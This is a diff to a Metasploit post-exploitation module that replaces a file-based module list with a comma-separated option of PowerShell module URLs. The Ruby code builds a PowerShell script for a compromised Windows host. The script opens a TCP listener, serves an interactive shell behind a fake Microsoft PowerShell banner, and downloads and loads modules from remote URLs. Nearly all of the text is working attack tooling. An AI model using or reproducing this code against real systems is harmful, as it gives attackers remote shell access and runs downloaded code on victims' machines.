@@ -29,7 +29,7 @@ class Metasploit3 < Msf::Post
 
     register_options(
       [
-        OptString.new( 'MOD_FILE',  [false, 'A file containing a list of powershell modules to download, must be a correct URL', ""]),
+        OptString.new( 'LOAD_MODULES',  [false, 'A list of powershell modules seperated by a columns, e.g. set LOAD_MODULES http://www.powershell.com/power1.ps1,http://www.powershell.com/power2.ps1,', ""]),
         OptString.new( 'RHOST',  [false, 'The IP of the system being exploited = rhost', ""]),
         OptString.new( 'LPORT',  [false, 'The PORT of the PowerShell listener = lhost', "55555"])
       ], self.class)
@@ -53,27 +53,6 @@ class Metasploit3 < Msf::Post
       'RunAsJob'       => true
     )
     print_status("Multi/handler started: payload=windows/shell_bind_tcp rhost=" + rhost + " lport=" + rport)
-  end
-
-  #
-  # Read in a powershell script stored in +script+
-  #
-  def read_script(script)
-    mods = ''
-    begin
-      # Open script file for reading
-      fd = ::File.new(script, 'r')
-      while (line = fd.gets)
-        mods << "\"" + line.delete!("\n") + "\",\n"
-      end
-
-      # Close open file
-      fd.close()
-    rescue Errno::ENAMETOOLONG, Errno::ENOENT
-      # Treat script as a... script
-      mods = script
-    end
-    return mods
   end
 
   #
@@ -138,10 +117,22 @@ class Metasploit3 < Msf::Post
 	@client = client
 
 	# Default parameters for payload
-	if (datastore['MOD_FILE'].empty?)
-	  modsall = '' 
+	if (datastore['LOAD_MODULES'].empty?)
+	  modsall = ''
 	else
-          modsall = read_script(datastore['MOD_FILE'])
+          print_status("Loading the following modules into the interactive PowerShell session:")
+	  modsall = ''
+          modstemp = datastore['LOAD_MODULES'].to_s
+          modsarray = modstemp.split(',')
+          modsarray.each do |mod| 
+	    print_good(mod.to_s)
+            if mod == modsarray.last
+              modsall = modsall + "\"" + mod.to_s + "\""
+            else
+              modsall = modsall + "\"" + mod.to_s + "\",\n" 
+            end
+          end
+          print("\n")
 	end
 
 	script_in=""+
@@ -154,15 +145,14 @@ class Metasploit3 < Msf::Post
 	"\n"+
 	"function powerfun($download) {\n"+
 	"\n"+
-	"   $modules = @(\n"+ modsall + 
-        "\"\")	\n"+
+	"   $modules = @("+ modsall + ")\n"+
 	"    $listener = [System.Net.Sockets.TcpListener]"+datastore['LPORT']+"\n"+
 	"    $listener.start()\n"+
 	"    [byte[]]$bytes = 0..255|%{0}\n"+
 	"    $client = $listener.AcceptTcpClient()\n"+
 	"    $stream = $client.GetStream() \n"+
 	"\n"+
-        "$sendbytes = ([text.encoding]::ASCII).GetBytes(\"Windows PowerShell`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n 'Get-Help Module-Name -Full' for more details on any module.`n`n\")\n"+
+        "$sendbytes = ([text.encoding]::ASCII).GetBytes(\"Windows PowerShell`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n 'Get-Help Module-Name -Full' for more details on any module.`n 'Get-Module -ListAvailable' for a list of loaded cmdlets.`n`n\")\n"+
         "$stream.Write($sendbytes,0,$sendbytes.Length)\n"+
         "$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')\n"+
         "$stream.Write($sendbytes,0,$sendbytes.Length)\n"+
@@ -192,7 +182,7 @@ class Metasploit3 < Msf::Post
 	"}\n"+
 	"\n"
 
-	if (datastore['MOD_FILE'].empty?)
+	if (datastore['LOAD_MODULES'].empty?)
 	script_in = script_in + "powerfun \n" 
 	else
 	script_in = script_in + "powerfun 1\n"
